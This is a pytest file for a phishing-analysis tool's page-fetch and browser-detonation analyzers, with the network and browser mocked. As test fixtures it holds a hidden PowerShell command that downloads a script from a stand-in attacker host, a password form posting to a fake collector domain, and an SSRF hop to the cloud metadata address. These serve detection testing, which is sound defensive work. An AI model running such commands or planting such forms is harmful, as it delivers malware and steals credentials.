"""Tests for the active fetch + detonation analyzers (offline; network/browser mocked).

``safe_fetch`` and ``detonate`` are the only ways these analyzers touch the outside
world, so every test replaces them with deterministic fakes. No real network or browser
is used here; the live-browser detonation is exercised in ``tests/intel/test_detonate.py``.
"""

from __future__ import annotations

import pytest

from uniphish.analyzers import fetch as fetchmod
from uniphish.analyzers.fetch import DetonationAnalyzer, FetchAnalyzer
from uniphish.core.analyzer import REGISTRY, AnalysisContext, AnalysisOptions
from uniphish.core.engine import Engine
from uniphish.core.net import FetchResult, Hop
from uniphish.core.types import Artifact, ArtifactKind
from uniphish.intel.detonate import DetonationResult


# --------------------------------------------------------------------------- helpers
def mk_result(
    url,
    *,
    final_url=None,
    status=200,
    body=b"",
    chain=None,
    ip="93.184.216.34",
    content_type="text/html",
    charset="utf-8",
    error=None,
    blocked_reason=None,
    truncated=False,
):
    final_url = url if final_url is None else final_url
    if chain is None:
        chain = [Hop(url=url, status=status, ip=ip, location=None)]
    headers = {"content-type": content_type} if content_type else {}
    return FetchResult(
        url=url,
        final_url=final_url,
        status=status,
        headers=headers,
        body=body,
        truncated=truncated,
        chain=chain,
        ip=ip,
        elapsed_ms=1.0,
        error=error,
        blocked_reason=blocked_reason,
        content_type=content_type,
        charset=charset,
    )


def patch_fetch(monkeypatch, result):
    async def fake(url, **kw):
        return result

    monkeypatch.setattr(fetchmod, "safe_fetch", fake)


def ctx(**opts):
    options = AnalysisOptions(online=True, **opts)
    return AnalysisContext(options=options)


HTML_CRED = (
    b"<html><head><title>PayPal</title></head><body>"
    b"<form action='https://collector.evil.test/c'><input type='password' name='pw'>"
    b"</form></body></html>"
)


# --------------------------------------------------------------------------- registration
def test_registered():
    assert REGISTRY["fetch"] is FetchAnalyzer
    assert REGISTRY["detonate"] is DetonationAnalyzer
    assert FetchAnalyzer.kinds == frozenset({ArtifactKind.URL})
    assert FetchAnalyzer.stage == 30 and FetchAnalyzer.requires_online
    assert not FetchAnalyzer.requires_detonation
    assert DetonationAnalyzer.requires_detonation and DetonationAnalyzer.requires_online


async def test_applies_gating():
    a = FetchAnalyzer()
    url = Artifact.from_url("https://good.example/login")
    assert not a.applies(url, ctx(fetch_pages=False))
    assert a.applies(url, ctx(fetch_pages=True))
    # non-http schemes and data artifacts are skipped
    assert not a.applies(Artifact.from_url("mailto:x@y.test"), ctx(fetch_pages=True))


# --------------------------------------------------------------------------- static fetch
async def test_landing_page_becomes_child_and_hops_are_indicators(monkeypatch):
    chain = [
        Hop(
            url="http://bit.ly/x", status=302, ip="1.2.3.4", location="https://evil.pages.dev/login"
        ),
        Hop(url="https://evil.pages.dev/login", status=200, ip="5.6.7.8", location=None),
    ]
    patch_fetch(
        monkeypatch,
        mk_result(
            "http://bit.ly/x",
            final_url="https://evil.pages.dev/login",
            body=HTML_CRED,
            chain=chain,
            ip="5.6.7.8",
        ),
    )
    res = await FetchAnalyzer().analyze(Artifact.from_url("http://bit.ly/x"), ctx(fetch_pages=True))

    pages = [c for c in res.children if c.kind is ArtifactKind.PAGE]
    assert len(pages) == 1
    child = pages[0]
    assert child.origin == "fetch.page"
    assert child.url == "https://evil.pages.dev/login"
    assert b"password" in (child.content or b"")

    roles = {(i.type.value, i.role): i.value for i in res.indicators}
    assert ("url", "landing") in roles and roles[
        ("url", "landing")
    ] == "https://evil.pages.dev/login"
    assert ("url", "redirect") in roles and roles[("url", "redirect")] == "http://bit.ly/x"
    assert ("domain", "landing") in roles and roles[("domain", "landing")] == "evil.pages.dev"
    assert ("ipv4", "landing") in roles and roles[("ipv4", "landing")] == "5.6.7.8"


async def test_ssrf_blocked_yields_note_signal(monkeypatch):
    patch_fetch(
        monkeypatch,
        mk_result(
            "http://redir.evil.test/go",
            final_url="http://redir.evil.test/go",
            status=0,
            body=b"",
            chain=[
                Hop(
                    url="http://169.254.169.254/latest/meta-data/", status=0, ip=None, location=None
                )
            ],
            content_type=None,
            ip=None,
            blocked_reason="redir.evil.test resolves to non-public address 169.254.169.254",
        ),
    )
    res = await FetchAnalyzer().analyze(
        Artifact.from_url("http://redir.evil.test/go"), ctx(fetch_pages=True)
    )
    sig = next(s for s in res.signals if s.id == "fetch.ssrf_blocked")
    assert sig.category == "fetch" and sig.weight == pytest.approx(2.0)
    assert "169.254.169.254" in sig.evidence["blocked_reason"]
    # a blocked fetch produces no landing child
    assert not res.children


async def test_data_uri_landing_signal(monkeypatch):
    chain = [
        Hop(
            url="http://smug.evil.test/a",
            status=302,
            ip="1.1.1.1",
            location="data:text/html;base64,PGh0bWw+",
        ),
        Hop(url="data:text/html;base64,PGh0bWw+", status=0, ip=None, location=None),
    ]
    patch_fetch(
        monkeypatch,
        mk_result(
            "http://smug.evil.test/a",
            final_url="http://smug.evil.test/a",
            status=0,
            body=b"",
            chain=chain,
            content_type=None,
            ip="1.1.1.1",
            blocked_reason="scheme not allowed: data",
        ),
    )
    res = await FetchAnalyzer().analyze(
        Artifact.from_url("http://smug.evil.test/a"), ctx(fetch_pages=True)
    )
    sig = next(s for s in res.signals if s.id == "fetch.landing_data_uri")
    assert sig.weight == pytest.approx(2.0) and "T1566.002" in sig.mitre


async def test_redirect_cross_into_lots(monkeypatch):
    chain = [
        Hop(
            url="http://bit.ly/x", status=302, ip="1.2.3.4", location="https://evil.pages.dev/login"
        ),
        Hop(url="https://evil.pages.dev/login", status=200, ip="5.6.7.8", location=None),
    ]
    patch_fetch(
        monkeypatch,
        mk_result(
            "http://bit.ly/x",
            final_url="https://evil.pages.dev/login",
            body=b"<html></html>",
            chain=chain,
        ),
    )
    res = await FetchAnalyzer().analyze(Artifact.from_url("http://bit.ly/x"), ctx(fetch_pages=True))
    sig = next(s for s in res.signals if s.id == "fetch.redirect_cross")
    assert "lots_landing" in sig.evidence["reasons"]
    assert sig.evidence["lots_host"] == "Cloudflare Pages"
    assert sig.evidence["start_is_shortener"] is True


async def test_redirect_cross_brand_change(monkeypatch):
    start = "http://paypal-login.account-verify.test/signin"
    chain = [
        Hop(url=start, status=302, ip="1.2.3.4", location="https://www.microsoft.com/"),
        Hop(url="https://www.microsoft.com/", status=200, ip="9.9.9.9", location=None),
    ]
    patch_fetch(
        monkeypatch,
        mk_result(
            start, final_url="https://www.microsoft.com/", body=b"<html></html>", chain=chain
        ),
    )
    res = await FetchAnalyzer().analyze(Artifact.from_url(start), ctx(fetch_pages=True))
    sig = next(s for s in res.signals if s.id == "fetch.redirect_cross")
    assert "brand_change" in sig.evidence["reasons"]
    assert sig.evidence["from_brand"] == "paypal" and sig.evidence["to_brand"] == "microsoft"


async def test_benign_shortener_to_known_site_does_not_cross(monkeypatch):
    chain = [
        Hop(
            url="http://bit.ly/y",
            status=301,
            ip="1.2.3.4",
            location="https://www.nytimes.com/section/world",
        ),
        Hop(url="https://www.nytimes.com/section/world", status=200, ip="8.8.8.8", location=None),
    ]
    patch_fetch(
        monkeypatch,
        mk_result(
            "http://bit.ly/y",
            final_url="https://www.nytimes.com/section/world",
            body=b"<html><body>news</body></html>",
            chain=chain,
        ),
    )
    res = await FetchAnalyzer().analyze(Artifact.from_url("http://bit.ly/y"), ctx(fetch_pages=True))
    assert not any(s.id == "fetch.redirect_cross" for s in res.signals)


async def test_non_html_landing_becomes_file_child(monkeypatch):
    patch_fetch(
        monkeypatch,
        mk_result(
            "https://host.example/invoice.pdf",
            body=b"%PDF-1.5\n1 0 obj<<>>",
            content_type="application/pdf",
        ),
    )
    res = await FetchAnalyzer().analyze(
        Artifact.from_url("https://host.example/invoice.pdf"), ctx(fetch_pages=True)
    )
    files = [c for c in res.children if c.kind is ArtifactKind.FILE]
    assert len(files) == 1
    assert files[0].origin == "fetch.download" and files[0].filename == "invoice.pdf"


async def test_fetch_error_records_meta_no_signals(monkeypatch):
    patch_fetch(
        monkeypatch,
        mk_result(
            "https://dead.example/", status=0, body=b"", content_type=None, ip=None, error="timeout"
        ),
    )
    res = await FetchAnalyzer().analyze(
        Artifact.from_url("https://dead.example/"), ctx(fetch_pages=True)
    )
    assert res.meta["fetch"]["error"] == "timeout"
    assert not res.signals and not res.children


async def test_engine_runs_fetch_and_analyzes_landing(monkeypatch):
    chain = [
        Hop(
            url="http://bit.ly/x", status=302, ip="1.2.3.4", location="https://evil.pages.dev/login"
        ),
        Hop(url="https://evil.pages.dev/login", status=200, ip="5.6.7.8", location=None),
    ]
    patch_fetch(
        monkeypatch,
        mk_result(
            "http://bit.ly/x",
            final_url="https://evil.pages.dev/login",
            body=HTML_CRED,
            chain=chain,
            ip="5.6.7.8",
        ),
    )
    eng = Engine()
    verdict = await eng.analyze(
        Artifact.from_url("http://bit.ly/x"),
        AnalysisOptions(
            online=True, fetch_pages=True, detonate=False, enable=frozenset({"fetch", "page"})
        ),
    )
    # the landing page was analysed as a child and its credential-harvest risk propagated
    assert any(s.id == "fetch.redirect_cross" for s in verdict.signals)
    assert verdict.children, "expected the fetched landing page as a child verdict"
    child = verdict.children[0]
    assert child.kind is ArtifactKind.PAGE
    assert any(s.id.startswith("page.form.password") for s in child.signals)


async def test_fetched_landing_is_routed_through_page_kit_injection(monkeypatch):
    """The fetched page becomes a child that the page/kit/injection analyzers evaluate.

    We assert the analyzers *ran* on the child rather than any specific signature, so the
    test proves the integration without coupling to the (concurrently built) b4/b5 rules.
    """
    patch_fetch(monkeypatch, mk_result("https://land.example/login", body=HTML_CRED))
    eng = Engine()
    available = set(eng.analyzer_names())
    want = {"fetch", "page"} | ({"kits", "injection"} & available)
    verdict = await eng.analyze(
        Artifact.from_url("https://land.example/login"),
        AnalysisOptions(online=True, fetch_pages=True, enable=frozenset(want)),
    )
    assert verdict.children
    ran = {a.name for a in verdict.children[0].analyzers if a.status in ("ok", "skipped")}
    assert "page" in ran
    for optional in ("kits", "injection"):
        if optional in available:
            assert optional in ran, f"{optional} analyzer did not run on the fetched page"


# --------------------------------------------------------------------------- detonation
def det_ctx():
    return AnalysisContext(options=AnalysisOptions(online=True, detonate=True))


async def test_detonate_skips_without_playwright(monkeypatch):
    monkeypatch.setattr(fetchmod, "playwright_available", lambda: False)
    res = await DetonationAnalyzer().analyze(Artifact.from_url("https://x.test/"), det_ctx())
    assert res.meta["detonation"].startswith("skipped")
    assert not res.signals


async def test_detonate_runtime_clipboard_signal(monkeypatch):
    monkeypatch.setattr(fetchmod, "playwright_available", lambda: True)
    patch_fetch(
        monkeypatch,
        mk_result(
            "https://verify.evil.test/", body=b"<html><body>verify you are human</body></html>"
        ),
    )

    async def fake_det(**kw):
        return DetonationResult(
            start_url="https://verify.evil.test/",
            final_url="https://verify.evil.test/",
            dom_html="<html><body>verify you are human</body></html>",
            clipboard_writes=['powershell -w hidden -c "iwr https://evil.example/a.ps1"'],
        )

    monkeypatch.setattr(fetchmod, "detonate", fake_det)

    res = await DetonationAnalyzer().analyze(
        Artifact.from_url("https://verify.evil.test/"), det_ctx()
    )
    sig = next(s for s in res.signals if s.id == "fetch.runtime_clipboard")
    assert sig.weight == pytest.approx(3.0) and "T1204.004" in sig.mitre
    # the URL embedded in the pasted command is surfaced as an IOC
    assert any(i.role == "payload" and "evil.example" in i.value for i in res.indicators)


async def test_detonate_cloaking_signal(monkeypatch):
    monkeypatch.setattr(fetchmod, "playwright_available", lambda: True)
    patch_fetch(
        monkeypatch,
        mk_result(
            "https://cloak.evil.test/", body=b"<html><body>Loading, please wait.</body></html>"
        ),
    )

    async def fake_det(**kw):
        return DetonationResult(
            start_url="https://cloak.evil.test/",
            final_url="https://cloak.evil.test/",
            dom_html="<html><head><title>Sign in</title></head><body>"
            "<form><input type='password' name='pw'></form></body></html>",
        )

    monkeypatch.setattr(fetchmod, "detonate", fake_det)

    res = await DetonationAnalyzer().analyze(
        Artifact.from_url("https://cloak.evil.test/"), det_ctx()
    )
    sig = next(s for s in res.signals if s.id == "fetch.cloaking")
    assert sig.weight == pytest.approx(2.5)
    assert sig.evidence["rendered_password"] and not sig.evidence["static_password"]
    # rendered DOM is routed back as a child artifact for the structural matchers
    assert any(c.origin == "fetch.rendered" for c in res.children)


async def test_detonate_js_redirect_signal(monkeypatch):
    monkeypatch.setattr(fetchmod, "playwright_available", lambda: True)
    patch_fetch(monkeypatch, mk_result("https://a.test/", body=b"<html><body>hi</body></html>"))

    async def fake_det(**kw):
        return DetonationResult(
            start_url="https://a.test/",
            final_url="https://evil.example/landing",
            dom_html="<html><body>hi</body></html>",
            navigation_chain=["https://a.test/", "https://evil.example/landing"],
        )

    monkeypatch.setattr(fetchmod, "detonate", fake_det)

    res = await DetonationAnalyzer().analyze(Artifact.from_url("https://a.test/"), det_ctx())
    sig = next(s for s in res.signals if s.id == "fetch.js_redirect")
    assert sig.evidence["final_registrable"] == "evil.example"
    assert sig.weight == pytest.approx(2.0)


async def test_detonate_error_records_meta(monkeypatch):
    monkeypatch.setattr(fetchmod, "playwright_available", lambda: True)

    async def fake_det(**kw):
        return DetonationResult(start_url="https://x.test/", error="navigation: TimeoutError")

    monkeypatch.setattr(fetchmod, "detonate", fake_det)
    res = await DetonationAnalyzer().analyze(Artifact.from_url("https://x.test/"), det_ctx())
    assert res.meta["detonation_error"] == "navigation: TimeoutError"
    assert not res.signals
